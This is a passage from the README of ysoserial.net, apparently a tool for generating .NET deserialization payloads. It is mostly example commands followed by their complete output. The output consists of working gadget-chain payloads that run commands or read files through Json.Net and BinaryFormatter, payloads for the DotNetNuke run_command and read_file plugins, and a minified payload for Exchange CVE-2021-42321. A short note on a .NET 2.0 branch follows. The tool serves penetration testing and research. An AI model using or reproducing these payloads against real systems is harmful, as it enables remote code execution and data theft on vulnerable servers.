&lt;em&gt;ObjectDataProvider&lt;/em&gt; gadget.&lt;/h3&gt; &#xA;&lt;pre&gt;&lt;code&gt;$ ./ysoserial.exe -f Json.Net -g ObjectDataProvider -o raw -c &#34;calc&#34; -t&#xA;&#xA;{&#xA;    &#39;$type&#39;:&#39;System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35&#39;,&#xA;    &#39;MethodName&#39;:&#39;Start&#39;,&#xA;    &#39;MethodParameters&#39;:{&#xA;        &#39;$type&#39;:&#39;System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089&#39;,&#xA;        &#39;$values&#39;:[&#39;cmd&#39;,&#39;/ccalc&#39;]&#xA;    },&#xA;    &#39;ObjectInstance&#39;:{&#39;$type&#39;:&#39;System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089&#39;}&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Generate a &lt;strong&gt;calc.exe&lt;/strong&gt; payload for BinaryFormatter using &lt;em&gt;PSObject&lt;/em&gt; gadget.&lt;/h3&gt; &#xA;&lt;pre&gt;&lt;code&gt;$ ./ysoserial.exe -f BinaryFormatter -g PSObject -o base64 -c &#34;calc&#34; -t&#xA;&#xA;AAEAAAD/////AQAAAAAAAAAMAgAAAF9TeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uLCBWZXJzaW9uPTMuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49MzFiZjM4NTZhZDM2NGUzNQUBAAAAJVN5c3RlbS5NYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNPYmplY3QBAAAABkNsaVhtbAECAAAABgMAAACJFQ0KPE9ianMgVmVyc2lvbj0iMS4xLjAuMSIgeG1sbnM9Imh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vcG93ZXJzaGVsbC8yMDA0LzA0Ij4mI3hEOw0KPE9iaiBSZWZJZD0iMCI+JiN4RDsNCiAgICA8VE4gUmVmSWQ9IjAiPiYjeEQ7DQogICAgICA8VD5NaWNyb3NvZnQuTWFuYWdlbWVudC5JbmZyYXN0cnVjdHVyZS5DaW1JbnN0YW5jZSNTeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uL1J1bnNwYWNlSW52b2tlNTwvVD4mI3hEOw0KICAgICAgPFQ+TWljcm9zb2Z0Lk1hbmFnZW1lbnQuSW5mcmFzdHJ1Y3R1cmUuQ2ltSW5zdGFuY2UjUnVuc3BhY2VJbnZva2U1PC9UPiYjeEQ7DQogICAgICA8VD5NaWNyb3NvZnQuTWFuYWdlbWVudC5JbmZyYXN0cnVjdHVyZS5DaW1JbnN0YW5jZTwvVD4mI3hEOw0KICAgICAgPFQ+U3lzdGVtLk9iamVjdDwvVD4mI3hEOw0KICAgIDwvVE4+JiN4RDsNCiAgICA8VG9TdHJpbmc+UnVuc3BhY2VJbnZva2U1PC9Ub1N0cmluZz4mI3hEOw0KICAgIDxPYmogUmVmSWQ9IjEiPiYjeEQ7DQogICAgICA8VE5SZWYgUmVmSWQ9IjAiIC8+JiN4RDsNCiAgICAgIDxUb1N0cmluZz5SdW5zcGFjZUludm9rZTU8L1RvU3RyaW5nPiYjeEQ7DQogICAgICA8UHJvcHM+JiN4RDsNCiAgICAgICAgPE5pbCBOPSJQU0NvbXB1dGVyTmFtZSIgLz4mI3hEOw0KCQk8T2JqIE49InRlc3QxIiBSZWZJZCA9IjIwIiA+ICYjeEQ7DQogICAgICAgICAgPFROIFJlZklkPSIxIiA+ICYjeEQ7DQogICAgICAgICAgICA8VD5TeXN0ZW0uV2luZG93cy5NYXJrdXAuWGFtbFJlYWRlcltdLCBQcmVzZW50YXRpb25GcmFtZXdvcmssIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj0zMWJmMzg1NmFkMzY0ZTM1PC9UPiYjeEQ7DQogICAgICAgICAgICA8VD5TeXN0ZW0uQXJyYXk8L1Q+JiN4RDsNCiAgICAgICAgICAgIDxUPlN5c3RlbS5PYmplY3Q8L1Q+JiN4RDsNCiAgICAgICAgICA8L1ROPiYjeEQ7DQogICAgICAgICAgPExTVD4mI3hEOw0KICAgICAgICAgICAgPFMgTj0iSGFzaCIgPiAgDQoJCSZsdDtSZXNvdXJjZURpY3Rpb25hcnkNCiAgeG1sbnM9Imh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd2luZngvMjAwNi94YW1sL3ByZXNlbnRhdGlvbiINCiAgeG1sbnM6eD0iaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93aW5meC8yMDA2L3hhbWwiDQogIHhtbG5zOlN5c3RlbT0iY2xyLW5hbWVzcGFjZTpTeXN0ZW07YXNzZW1ibHk9bXNjb3JsaWIiDQogIHhtbG5zOkRpYWc9ImNsci1uYW1lc3BhY2U6U3lzdGVtLkRpYWdub3N0aWNzO2Fzc2VtYmx5PXN5c3RlbSImZ3Q7DQoJICZsdDtPYmplY3REYXRhUHJvdmlkZXIgeDpLZXk9IkxhdW5jaENhbGMiIE9iamVjdFR5cGUgPSAieyB4OlR5cGUgRGlhZzpQcm9jZXNzfSIgTWV0aG9kTmFtZSA9ICJTdGFydCIgJmd0Ow0KICAgICAmbHQ7T2JqZWN0RGF0YVByb3ZpZGVyLk1ldGhvZFBhcmFtZXRlcnMmZ3Q7DQogICAgICAgICZsdDtTeXN0ZW06U3RyaW5nJmd0O2NtZCZsdDsvU3lzdGVtOlN0cmluZyZndDsNCiAgICAgICAgJmx0O1N5c3RlbTpTdHJpbmcmZ3Q7L2MgImNhbGMiICZsdDsvU3lzdGVtOlN0cmluZyZndDsNCiAgICAgJmx0Oy9PYmplY3REYXRhUHJvdmlkZXIuTWV0aG9kUGFyYW1ldGVycyZndDsNCiAgICAmbHQ7L09iamVjdERhdGFQcm92aWRlciZndDsNCiZsdDsvUmVzb3VyY2VEaWN0aW9uYXJ5Jmd0Ow0KCQkJPC9TPiYjeEQ7DQogICAgICAgICAgPC9MU1Q+JiN4RDsNCiAgICAgICAgPC9PYmo+JiN4RDsNCiAgICAgIDwvUHJvcHM+JiN4RDsNCiAgICAgIDxNUz4mI3hEOw0KICAgICAgICA8T2JqIE49Il9fQ2xhc3NNZXRhZGF0YSIgUmVmSWQgPSIyIj4gJiN4RDsNCiAgICAgICAgICA8VE4gUmVmSWQ9IjEiID4gJiN4RDsNCiAgICAgICAgICAgIDxUPlN5c3RlbS5Db2xsZWN0aW9ucy5BcnJheUxpc3Q8L1Q+JiN4RDsNCiAgICAgICAgICAgIDxUPlN5c3RlbS5PYmplY3Q8L1Q+JiN4RDsNCiAgICAgICAgICA8L1ROPiYjeEQ7DQogICAgICAgICAgPExTVD4mI3hEOw0KICAgICAgICAgICAgPE9iaiBSZWZJZD0iMyI+ICYjeEQ7DQogICAgICAgICAgICAgIDxNUz4mI3hEOw0KICAgICAgICAgICAgICAgIDxTIE49IkNsYXNzTmFtZSI+UnVuc3BhY2VJbnZva2U1PC9TPiYjeEQ7DQogICAgICAgICAgICAgICAgPFMgTj0iTmFtZXNwYWNlIj5TeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uPC9TPiYjeEQ7DQogICAgICAgICAgICAgICAgPE5pbCBOPSJTZXJ2ZXJOYW1lIiAvPiYjeEQ7DQogICAgICAgICAgICAgICAgPEkzMiBOPSJIYXNoIj40NjA5MjkxOTI8L0kzMj4mI3hEOw0KICAgICAgICAgICAgICAgIDxTIE49Ik1pWG1sIj4gJmx0O0NMQVNTIE5BTUU9IlJ1bnNwYWNlSW52b2tlNSIgJmd0OyZsdDtQUk9QRVJUWSBOQU1FPSJ0ZXN0MSIgVFlQRSA9InN0cmluZyIgJmd0OyZsdDsvUFJPUEVSVFkmZ3Q7Jmx0Oy9DTEFTUyZndDs8L1M+JiN4RDsNCiAgICAgICAgICAgICAgPC9NUz4mI3hEOw0KICAgICAgICAgICAgPC9PYmo+JiN4RDsNCiAgICAgICAgICA8L0xTVD4mI3hEOw0KICAgICAgICA8L09iaj4mI3hEOw0KICAgICAgPC9NUz4mI3hEOw0KICAgIDwvT2JqPiYjeEQ7DQogICAgPE1TPiYjeEQ7DQogICAgICA8UmVmIE49Il9fQ2xhc3NNZXRhZGF0YSIgUmVmSWQgPSIyIiAvPiYjeEQ7DQogICAgPC9NUz4mI3hEOw0KICA8L09iaj4mI3hEOw0KPC9PYmpzPgs=&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Generate a run_command payload for DotNetNuke using its plugin&lt;/h3&gt; &#xA;&lt;pre&gt;&lt;code&gt;$ ./ysoserial.exe -p DotNetNuke -m run_command -c calc.exe&#xA;&#xA;&amp;lt;profile&amp;gt;&amp;lt;item key=&#34;foo&#34; type=&#34;System.Data.Services.Internal.ExpandedWrapper`2[[System.Web.UI.ObjectStateFormatter, System.Web, Version = 4.0.0.0, Culture = neutral, PublicKeyToken = b03f5f7f11d50a3a],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089&#34;&amp;gt;&amp;lt;ExpandedWrapperOfObjectStateFormatterObjectDataProvider xmlns:xsd=&#34; [http://www.w3.org/2001/XMLSchema](http://www.w3.org/2001/XMLSchema) &#34; xmlns:xsi=&#34; [http://www.w3.org/2001/XMLSchema-instance](http://www.w3.org/2001/XMLSchema-instance) &#34;&amp;gt;&amp;lt;ExpandedElement/&amp;gt;&amp;lt;ProjectedProperty0&amp;gt;&amp;lt;MethodName&amp;gt;Deserialize&amp;lt;/MethodName&amp;gt;&amp;lt;MethodParameters&amp;gt;&amp;lt;anyType xsi:type=&#34;xsd:string&#34;&amp;gt;/wEyxBEAAQAAAP////8BAAAAAAAAAAwCAAAASVN5c3RlbSwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODkFAQAAAIQBU3lzdGVtLkNvbGxlY3Rpb25zLkdlbmVyaWMuU29ydGVkU2V0YDFbW1N5c3RlbS5TdHJpbmcsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dBAAAAAVDb3VudAhDb21wYXJlcgdWZXJzaW9uBUl0ZW1zAAMABgiNAVN5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLkNvbXBhcmlzb25Db21wYXJlcmAxW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQgCAAAAAgAAAAkDAAAAAgAAAAkEAAAABAMAAACNAVN5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLkNvbXBhcmlzb25Db21wYXJlcmAxW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQEAAAALX2NvbXBhcmlzb24DIlN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xkZXIJBQAAABEEAAAAAgAAAAYGAAAACy9jIGNhbGMuZXhlBgcAAAADY21kBAUAAAAiU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcgMAAAAIRGVsZWdhdGUHbWV0aG9kMAdtZXRob2QxAwMDMFN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xkZXIrRGVsZWdhdGVFbnRyeS9TeXN0ZW0uUmVmbGVjdGlvbi5NZW1iZXJJbmZvU2VyaWFsaXphdGlvbkhvbGRlci9TeXN0ZW0uUmVmbGVjdGlvbi5NZW1iZXJJbmZvU2VyaWFsaXphdGlvbkhvbGRlcgkIAAAACQkAAAAJCgAAAAQIAAAAMFN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xkZXIrRGVsZWdhdGVFbnRyeQcAAAAEdHlwZQhhc3NlbWJseQZ0YXJnZXQSdGFyZ2V0VHlwZUFzc2VtYmx5DnRhcmdldFR5cGVOYW1lCm1ldGhvZE5hbWUNZGVsZWdhdGVFbnRyeQEBAgEBAQMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcitEZWxlZ2F0ZUVudHJ5BgsAAACwAlN5c3RlbS5GdW5jYDNbW1N5c3RlbS5TdHJpbmcsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV0sW1N5c3RlbS5TdHJpbmcsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV0sW1N5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzLCBTeXN0ZW0sIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0GDAAAAEttc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODkKBg0AAABJU3lzdGVtLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OQYOAAAAGlN5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzBg8AAAAFU3RhcnQJEAAAAAQJAAAAL1N5c3RlbS5SZWZsZWN0aW9uLk1lbWJlckluZm9TZXJpYWxpemF0aW9uSG9sZGVyBwAAAAROYW1lDEFzc2VtYmx5TmFtZQlDbGFzc05hbWUJU2lnbmF0dXJlClNpZ25hdHVyZTIKTWVtYmVyVHlwZRBHZW5lcmljQXJndW1lbnRzAQEBAQEAAwgNU3lzdGVtLlR5cGVbXQkPAAAACQ0AAAAJDgAAAAYUAAAAPlN5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzIFN0YXJ0KFN5c3RlbS5TdHJpbmcsIFN5c3RlbS5TdHJpbmcpBhUAAAA+U3lzdGVtLkRpYWdub3N0aWNzLlByb2Nlc3MgU3RhcnQoU3lzdGVtLlN0cmluZywgU3lzdGVtLlN0cmluZykIAAAACgEKAAAACQAAAAYWAAAAB0NvbXBhcmUJDAAAAAYYAAAADVN5c3RlbS5TdHJpbmcGGQAAACtJbnQzMiBDb21wYXJlKFN5c3RlbS5TdHJpbmcsIFN5c3RlbS5TdHJpbmcpBhoAAAAyU3lzdGVtLkludDMyIENvbXBhcmUoU3lzdGVtLlN0cmluZywgU3lzdGVtLlN0cmluZykIAAAACgEQAAAACAAAAAYbAAAAcVN5c3RlbS5Db21wYXJpc29uYDFbW1N5c3RlbS5TdHJpbmcsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dCQwAAAAKCQwAAAAJGAAAAAkWAAAACgs=&amp;lt;/anyType&amp;gt;&amp;lt;/MethodParameters&amp;gt;&amp;lt;ObjectInstance xsi:type=&#34;ObjectStateFormatter&#34;&amp;gt;&amp;lt;/ObjectInstance&amp;gt;&amp;lt;/ProjectedProperty0&amp;gt;&amp;lt;/ExpandedWrapperOfObjectStateFormatterObjectDataProvider&amp;gt;&amp;lt;/item&amp;gt;&amp;lt;/profile&amp;gt;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Generate a read_file payload for DotNetNuke using its plugin&lt;/h3&gt; &#xA;&lt;pre&gt;&lt;code&gt;$ ./ysoserial.exe -p DotNetNuke -m read_file -f win.ini&#xA;&#xA;&amp;lt;profile&amp;gt;&amp;lt;item key=&#34;name1: key1&#34; type=&#34;System.Data.Services.Internal.ExpandedWrapper`2[[DotNetNuke.Common.Utilities.FileSystemUtils],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089&#34;&amp;gt;&amp;lt;ExpandedWrapperOfFileSystemUtilsObjectDataProvider xmlns:xsd=&#34;http://www.w3.org/2001/XMLSchema&#34; xmlns:xsi=&#34;http://www.w3.org/2001/XMLSchema-instance&#34;&amp;gt;&amp;lt;ExpandedElement/&amp;gt;&amp;lt;ProjectedProperty0&amp;gt;&amp;lt;MethodName&amp;gt;WriteFile&amp;lt;/MethodName&amp;gt;&amp;lt;MethodParameters&amp;gt;&amp;lt;anyType xsi:type=&#34;xsd:string&#34;&amp;gt;win.ini&amp;lt;/anyType&amp;gt;&amp;lt;/MethodParameters&amp;gt;&amp;lt;ObjectInstance xsi:type=&#34;FileSystemUtils&#34;&amp;gt;&amp;lt;/ObjectInstance&amp;gt;&amp;lt;/ProjectedProperty0&amp;gt;&amp;lt;/ExpandedWrapperOfFileSystemUtilsObjectDataProvider&amp;gt;&amp;lt;/item&amp;gt;&amp;lt;/profile&amp;gt;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Generate a minified BinaryFormatter payload to exploit Exchange CVE-2021-42321 using the ActivitySurrogateDisableTypeCheck gadget inside the ClaimsPrincipal gadget.&lt;/h3&gt; &#xA;&lt;pre&gt;&lt;code&gt;&amp;gt; .\ysoserial.exe -g ClaimsPrincipal -f BinaryFormatter -c foobar -bgc ActivitySurrogateDisableTypeCheck --minify --ust&#xA;&#xA;AAEAAAD/////AQAAAAAAAAAEAQAAACZTeXN0ZW0uU2VjdXJpdHkuQ2xhaW1zLkNsYWltc1ByaW5jaXBhbAEAAAAcbV9zZXJpYWxpemVkQ2xhaW1zSWRlbnRpdGllcwEGBQAAAKgfQUFFQUFBRC8vLy8vQVFBQUFBQUFBQUFNQWdBQUFFWlRlWE4wWlcwc1ZtVnljMmx2YmowMExqQXVNQzR3TEVOMWJIUjFjbVU5Ym1WMWRISmhiQ3hRZFdKc2FXTkxaWGxVYjJ0bGJqMWlOemRoTldNMU5qRTVNelJsTURnNUJRRUFBQUJBVTNsemRHVnRMa052Ykd4bFkzUnBiMjV6TGtkbGJtVnlhV011VTI5eWRHVmtVMlYwWURGYlcxTjVjM1JsYlM1VGRISnBibWNzYlhOamIzSnNhV0pkWFFRQUFBQUZRMjkxYm5RSVEyOXRjR0Z5WlhJSFZtVnljMmx2YmdWSmRHVnRjd0FEQUFZSVNWTjVjM1JsYlM1RGIyeHNaV04wYVc5dWN5NUhaVzVsY21sakxrTnZiWEJoY21semIyNURiMjF3WVhKbGNtQXhXMXRUZVhOMFpXMHVVM1J5YVc1bkxHMXpZMjl5YkdsaVhWMElBZ0FBQUFJQUFBQUpBd0FBQUFJQUFBQUpCQUFBQUFRREFBQUFTVk41YzNSbGJTNURiMnhzWldOMGFXOXVjeTVIWlc1bGNtbGpMa052YlhCaGNtbHpiMjVEYjIxd1lYSmxjbUF4VzF0VGVYTjBaVzB1VTNSeWFXNW5MRzF6WTI5eWJHbGlYVjBCQUFBQUMxOWpiMjF3WVhKcGMyOXVBeUpUZVhOMFpXMHVSR1ZzWldkaGRHVlRaWEpwWVd4cGVtRjBhVzl1U0c5c1pHVnlDUVVBQUFBUkJBQUFBQUlBQUFBR0JnQUFBQUFHQndBQUFQMExQRkpsYzI5MWNtTmxSR2xqZEdsdmJtRnllU0I0Yld4dWN6MGlhSFIwY0RvdkwzTmphR1Z0WVhNdWJXbGpjbTl6YjJaMExtTnZiUzkzYVc1bWVDOHlNREEyTDNoaGJXd3ZjSEpsYzJWdWRHRjBhVzl1SWlCNGJXeHVjenBoUFNKb2RIUndPaTh2YzJOb1pXMWhjeTV0YVdOeWIzTnZablF1WTI5dEwzZHBibVo0THpJd01EWXZlR0Z0YkNJZ2VHMXNibk02WWowaVkyeHlMVzVoYldWemNHRmpaVHBUZVhOMFpXMDdZWE56WlcxaWJIazliWE5qYjNKc2FXSWlJSGh0Ykc1ek9tTTlJbU5zY2kxdVlXMWxjM0JoWTJVNlUzbHpkR1Z0TGtOdmJtWnBaM1Z5WVhScGIyNDdZWE56WlcxaWJIazlVM2x6ZEdWdExrTnZibVpwWjNWeVlYUnBiMjRpSUhodGJHNXpPbVE5SW1Oc2NpMXVZVzFsYzNCaFkyVTZVM2x6ZEdWdExsSmxabXhsWTNScGIyNDdZWE56WlcxaWJIazliWE5qYjNKc2FXSWlQanhQWW1wbFkzUkVZWFJoVUhKdmRtbGtaWElnWVRwTFpYazlJblI1Y0dVaUlFOWlhbVZqZEZSNWNHVTlJbnRoT2xSNWNHVWdZanBVZVhCbGZTSWdUV1YwYUc5a1RtRnRaVDBpUjJWMFZIbHdaU0krUEU5aWFtVmpkRVJoZEdGUWNtOTJhV1JsY2k1TlpYUm9iMlJRWVhKaGJXVjBaWEp6UGp4aU9sTjBjbWx1Wno1VGVYTjBaVzB1VjI5eWEyWnNiM2N1UTI5dGNHOXVaVzUwVFc5a1pXd3VRWEJ3VTJWMGRHbHVaM01zVTNsemRHVnRMbGR2Y210bWJHOTNMa052YlhCdmJtVnVkRTF2WkdWc0xGWmxjbk5wYjI0OU5DNHdMakF1TUN4RGRXeDBkWEpsUFc1bGRYUnlZV3dzVUhWaWJHbGpTMlY1Vkc5clpXNDlNekZpWmpNNE5UWmhaRE0yTkdVek5Ud3ZZanBUZEhKcGJtYytQQzlQWW1wbFkzUkVZWFJoVUhKdmRtbGtaWEl1VFdWMGFHOWtVR0Z5WVcxbGRHVnljejQ4TDA5aWFtVmpkRVJoZEdGUWNtOTJhV1JsY2o0OFQySnFaV04wUkdGMFlWQnliM1pwWkdWeUlHRTZTMlY1UFNKbWFXVnNaQ0lnVDJKcVpXTjBTVzV6ZEdGdVkyVTlJbnRUZEdGMGFXTlNaWE52ZFhKalpTQjBlWEJsZlNJZ1RXVjBhRzlrVG1GdFpUMGlSMlYwUm1sbGJHUWlQanhQWW1wbFkzUkVZWFJoVUhKdmRtbGtaWEl1VFdWMGFHOWtVR0Z5WVcxbGRHVnljejQ4WWpwVGRISnBibWMrWkdsellXSnNaVUZqZEdsMmFYUjVVM1Z5Y205bllYUmxVMlZzWldOMGIzSlVlWEJsUTJobFkyczhMMkk2VTNSeWFXNW5QanhrT2tKcGJtUnBibWRHYkdGbmN6NDBNRHd2WkRwQ2FXNWthVzVuUm14aFozTStQQzlQWW1wbFkzUkVZWFJoVUhKdmRtbGtaWEl1VFdWMGFHOWtVR0Z5WVcxbGRHVnljejQ4TDA5aWFtVmpkRVJoZEdGUWNtOTJhV1JsY2o0OFQySnFaV04wUkdGMFlWQnliM1pwWkdWeUlHRTZTMlY1UFNKelpYUWlJRTlpYW1WamRFbHVjM1JoYm1ObFBTSjdVM1JoZEdsalVtVnpiM1Z5WTJVZ1ptbGxiR1I5SWlCTlpYUm9iMlJPWVcxbFBTSlRaWFJXWVd4MVpTSStQRTlpYW1WamRFUmhkR0ZRY205MmFXUmxjaTVOWlhSb2IyUlFZWEpoYldWMFpYSnpQanhpT2s5aWFtVmpkQzgrUEdJNlFtOXZiR1ZoYmo1MGNuVmxQQzlpT2tKdmIyeGxZVzQrUEM5UFltcGxZM1JFWVhSaFVISnZkbWxrWlhJdVRXVjBhRzlrVUdGeVlXMWxkR1Z5Y3o0OEwwOWlhbVZqZEVSaGRHRlFjbTkyYVdSbGNqNDhUMkpxWldOMFJHRjBZVkJ5YjNacFpHVnlJR0U2UzJWNVBTSnpaWFJOWlhSb2IyUWlJRTlpYW1WamRFbHVjM1JoYm1ObFBTSjdZVHBUZEdGMGFXTWdZenBEYjI1bWFXZDFjbUYwYVc5dVRXRnVZV2RsY2k1QmNIQlRaWFIwYVc1bmMzMGlJRTFsZEdodlpFNWhiV1U5SWxObGRDSStQRTlpYW1WamRFUmhkR0ZRY205MmFXUmxjaTVOWlhSb2IyUlFZWEpoYldWMFpYSnpQanhpT2xOMGNtbHVaejV0YVdOeWIzTnZablE2VjI5eWEyWnNiM2REYjIxd2IyNWxiblJOYjJSbGJEcEVhWE5oWW14bFFXTjBhWFpwZEhsVGRYSnliMmRoZEdWVFpXeGxZM1J2Y2xSNWNHVkRhR1ZqYXp3dllqcFRkSEpwYm1jK1BHSTZVM1J5YVc1blBuUnlkV1U4TDJJNlUzUnlhVzVuUGp3dlQySnFaV04wUkdGMFlWQnliM1pwWkdWeUxrMWxkR2h2WkZCaGNtRnRaWFJsY25NK1BDOVBZbXBsWTNSRVlYUmhVSEp2ZG1sa1pYSStQQzlTWlhOdmRYSmpaVVJwWTNScGIyNWhjbmsrQkFVQUFBQWlVM2x6ZEdWdExrUmxiR1ZuWVhSbFUyVnlhV0ZzYVhwaGRHbHZia2h2YkdSbGNnTUFBQUFJUkdWc1pXZGhkR1VIYldWMGFHOWtNQWR0WlhSb2IyUXhBd01ETUZONWMzUmxiUzVFWld4bFoyRjBaVk5sY21saGJHbDZZWFJwYjI1SWIyeGtaWElyUkdWc1pXZGhkR1ZGYm5SeWVTOVRlWE4wWlcwdVVtVm1iR1ZqZEdsdmJpNU5aVzFpWlhKSmJtWnZVMlZ5YVdGc2FYcGhkR2x2YmtodmJHUmxjaTlUZVhOMFpXMHVVbVZtYkdWamRHbHZiaTVOWlcxaVpYSkpibVp2VTJWeWFXRnNhWHBoZEdsdmJraHZiR1JsY2drSUFBQUFDUWtBQUFBSkNnQUFBQVFJQUFBQU1GTjVjM1JsYlM1RVpXeGxaMkYwWlZObGNtbGhiR2w2WVhScGIyNUliMnhrWlhJclJHVnNaV2RoZEdWRmJuUnllUWNBQUFBRWRIbHdaUWhoYzNObGJXSnNlUVowWVhKblpYUVNkR0Z5WjJWMFZIbHdaVUZ6YzJWdFlteDVEblJoY21kbGRGUjVjR1ZPWVcxbENtMWxkR2h2WkU1aGJXVU5aR1ZzWldkaGRHVkZiblJ5ZVFFQkFnRUJBUU13VTNsemRHVnRMa1JsYkdWbllYUmxVMlZ5YVdGc2FYcGhkR2x2YmtodmJHUmxjaXRFWld4bFoyRjBaVVZ1ZEhKNUJnc0FBQUF1VTNsemRHVnRMa1oxYm1OZ01sdGJVM2x6ZEdWdExsTjBjbWx1WjEwc1cxTjVjM1JsYlM1UFltcGxZM1JkWFFZTUFBQUFDRzF6WTI5eWJHbGlDZ1lOQUFBQVZWQnlaWE5sYm5SaGRHbHZia1p5WVcxbGQyOXlheXhXWlhKemFXOXVQVFF1TUM0d0xqQXNRM1ZzZEhWeVpUMXVaWFYwY21Gc0xGQjFZbXhwWTB0bGVWUnZhMlZ1UFRNeFltWXpPRFUyWVdRek5qUmxNelVHRGdBQUFDQlRlWE4wWlcwdVYybHVaRzkzY3k1TllYSnJkWEF1V0dGdGJGSmxZV1JsY2dZUEFBQUFCVkJoY25ObENSQUFBQUFFQ1FBQUFDOVRlWE4wWlcwdVVtVm1iR1ZqZEdsdmJpNU5aVzFpWlhKSmJtWnZVMlZ5YVdGc2FYcGhkR2x2YmtodmJHUmxjZ1lBQUFBRVRtRnRaUXhCYzNObGJXSnNlVTVoYldVSlEyeGhjM05PWVcxbENWTnBaMjVoZEhWeVpRcE5aVzFpWlhKVWVYQmxFRWRsYm1WeWFXTkJjbWQxYldWdWRITUJBUUVCQUFNSURWTjVjM1JsYlM1VWVYQmxXMTBKRHdBQUFBa05BQUFBQ1E0QUFBQUdGQUFBQUNKVGVYTjBaVzB1VDJKcVpXTjBJRkJoY25ObEtGTjVjM1JsYlM1VGRISnBibWNwQ0FBQUFBb0JDZ0FBQUFrQUFBQUdGUUFBQUFkRGIyMXdZWEpsQ1F3QUFBQUdGd0FBQUExVGVYTjBaVzB1VTNSeWFXNW5CaGdBQUFBclNXNTBNeklnUTI5dGNHRnlaU2hUZVhOMFpXMHVVM1J5YVc1bkxDQlRlWE4wWlcwdVUzUnlhVzVuS1FnQUFBQUtBUkFBQUFBSUFBQUFCaGtBQUFBa1UzbHpkR1Z0TGtOdmJYQmhjbWx6YjI1Z01WdGJVM2x6ZEdWdExsTjBjbWx1WjExZENRd0FBQUFLQ1F3QUFBQUpGd0FBQUFrVkFBQUFDZ3M9Cw==&#xA;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;v2 Branch&lt;/h2&gt; &#xA;&lt;p&gt;v2 branch is a copy of ysoserial.net (15/03/2018) that has been changed to work with .NET Framework 2.0 by &lt;a href=&#34;https://github.com/irsdl&#34;&gt;irsdl&lt;/a&gt;. Although this project can be used with applications that use .NET Framework v2.0, it also requires .NET Framework 3.5 to be installed on the target box as the gadgets depend on it. This problem will be resolved if new gadgets in .NET Framework 2.0 become identified in the future.&lt;/p&gt; &#xA;&lt;h2&gt;Contributing&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Fork it&lt;/li&gt; &#xA; &lt;li&gt;Create your feature branch (&lt;code&gt;git checkout -b 